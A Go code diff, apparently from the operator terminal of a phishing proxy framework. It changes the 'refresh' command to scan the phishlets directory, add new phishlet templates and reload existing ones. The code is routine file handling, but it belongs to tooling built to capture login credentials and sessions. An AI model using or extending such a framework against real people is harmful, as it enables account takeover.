@@ -868,27 +868,44 @@ func (t *Terminal) handlePhishlets(args []string) error {
 		switch args[0] {
 		case "refresh":
 			reloadedEnabled := false
-			for _, name := range t.cfg.GetPhishletNames() {
-				pl, err := t.cfg.GetPhishlet(name)
-				if err != nil {
+			pDir := t.cfg.GetPhishletsDir()
+			files, ferr := os.ReadDir(pDir)
+			if ferr != nil {
+				return fmt.Errorf("refresh: cannot read phishlets directory '%s': %v", pDir, ferr)
+			}
+			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
+			for _, f := range files {
+				if f.IsDir() {
 					continue
 				}
-				if pl.ParentName != "" {
+				m := pr.FindStringSubmatch(f.Name())
+				if m == nil || len(m) < 2 || m[1] == "" {
 					continue
 				}
-				newPl, err := NewPhishlet(name, pl.Path, nil, t.cfg)
-				if err != nil {
-					log.Error("refresh: failed to reload '%s': %v", name, err)
+				name := m[1]
+				fPath := filepath.Join(pDir, f.Name())
+				existing, lookupErr := t.cfg.GetPhishlet(name)
+				if lookupErr == nil && existing.ParentName != "" {
+					continue // skip child phishlets
+				}
+				newPl, parseErr := NewPhishlet(name, fPath, nil, t.cfg)
+				if parseErr != nil {
+					log.Error("refresh: failed to parse '%s': %v", f.Name(), parseErr)
 					continue
 				}
-				if err := t.cfg.ReloadPhishlet(name, newPl); err != nil {
-					log.Error("refresh: %v", err)
-					continue
+				if lookupErr != nil {
+					t.cfg.AddPhishlet(name, newPl)
+					log.Info("phishlet '%s' added", name)
+				} else {
+					if err := t.cfg.ReloadPhishlet(name, newPl); err != nil {
+						log.Error("refresh: %v", err)
+						continue
+					}
+					log.Info("phishlet '%s' refreshed", name)
 				}
 				if t.cfg.IsSiteEnabled(name) {
 					reloadedEnabled = true
 				}
-				log.Info("phishlet '%s' refreshed", name)
 			}
 			if reloadedEnabled {
 				t.cfg.refreshActiveHostnames()
